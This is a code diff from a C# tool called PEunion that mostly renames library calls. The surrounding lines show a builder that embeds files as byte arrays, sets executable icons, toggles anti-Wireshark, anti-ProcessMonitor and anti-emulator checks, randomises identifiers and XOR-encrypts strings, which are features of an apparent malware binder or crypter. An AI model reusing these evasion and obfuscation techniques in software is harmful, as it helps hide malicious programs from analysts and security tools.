@@ -1,4 +1,7 @@
-﻿using BytecodeApi;
+﻿using BytecodeApi.Extensions;
+using BytecodeApi.IO;
+using BytecodeApi.Mathematics;
+using BytecodeApi.Text;
 using Microsoft.CSharp;
 using System;
 using System.CodeDom.Compiler;
@@ -90,7 +93,7 @@ namespace PEunion
 					if (results.Errors.Count == 0 && project.IconPath != null)
 					{
 						WindowMain.Singleton.OverlayTitle = "Applying icon '" + Path.GetFileName(project.IconPath) + "'";
-						new FileInfo(path).ChangeExecutableIcon(project.IconPath);
+						ResourceFile.ChangeIcon(path, project.IconPath);
 					}
 					return results;
 				}
@@ -146,7 +149,7 @@ namespace PEunion
 					foreach (IEnumerable<byte> chunk in data.Chunk(1024))
 					{
 						byte[] line = chunk.ToArray();
-						block.AppendLine("\t\t\t\t" + line.Select(b => "0x" + b.ToString("x2") + ", ").CreateString().Trim());
+						block.AppendLine("\t\t\t\t" + line.Select(b => "0x" + b.ToStringInvariant("x2") + ", ").AsString().Trim());
 						progress += line.Length;
 						WindowMain.Singleton.OverlayProgress = progress * 100 / totalSize;
 					}
@@ -218,7 +221,7 @@ namespace PEunion
 				(project.FileItems.Any(file => file.AntiWireshark) || project.UrlItems.Any(file => file.AntiWireshark) ? null : "//") + "#define ENABLE_ANTI_WIRESHARK",
 				(project.FileItems.Any(file => file.AntiProcessMonitor) || project.UrlItems.Any(file => file.AntiProcessMonitor) ? null : "//") + "#define ENABLE_ANTI_PROCESSMONITOR",
 				(project.FileItems.Any(file => file.AntiEmulator) || project.UrlItems.Any(file => file.AntiEmulator) ? null : "//") + "#define ENABLE_ANTI_EMULATOR",
-			}.ToMultilineString();
+			}.AsMultilineString();
 
 			string assemblyInfoPart;
 			if (new[] { project.AssemblyTitle, project.AssemblyProduct, project.AssemblyCopyright, project.AssemblyVersion }.Any(str => !str.IsNullOrEmpty()))
@@ -263,7 +266,7 @@ namespace PEunion
 			{
 				case BuildObfuscationType.None:
 					return originalVariableName
-						.TrimEnd("__")
+						.TrimEndString("__")
 						.SubstringFrom("_", true);
 				case BuildObfuscationType.AlphaNumeric:
 					string alphabet = TextResources.Alphabet + TextResources.Alphabet.ToUpper();
@@ -272,12 +275,12 @@ namespace PEunion
 					return Enumerable
 						.Range(0, MathEx.Random.Next(10, 20))
 						.Select(i => MathEx.Random.NextObject((i == 0 ? alphabet : alphabetWithNumbers).ToCharArray()))
-						.CreateString();
+						.AsString();
 				case BuildObfuscationType.Special:
 					return Enumerable
 						.Range(0, MathEx.Random.Next(10, 20))
 						.Select(i => MathEx.Random.NextObject(specialCharacters.ToCharArray()))
-						.CreateString();
+						.AsString();
 				default:
 					throw new InvalidOperationException();
 			}
@@ -317,7 +320,7 @@ namespace PEunion
 			{
 				str = str.Replace(@"\\", @"\").Replace("\\\"", "\"");
 				byte key = MathEx.Random.NextByte();
-				return "__F_DecryptString__(\"\\x" + key.ToString("x") + str.Select(c => @"\x" + (c ^ key).ToString("x")).CreateString() + "\")";
+				return "__F_DecryptString__(\"\\x" + key.ToStringInvariant("x") + str.Select(c => @"\x" + (c ^ key).ToStringInvariant("x")).AsString() + "\")";
 			}
 			else
 			{
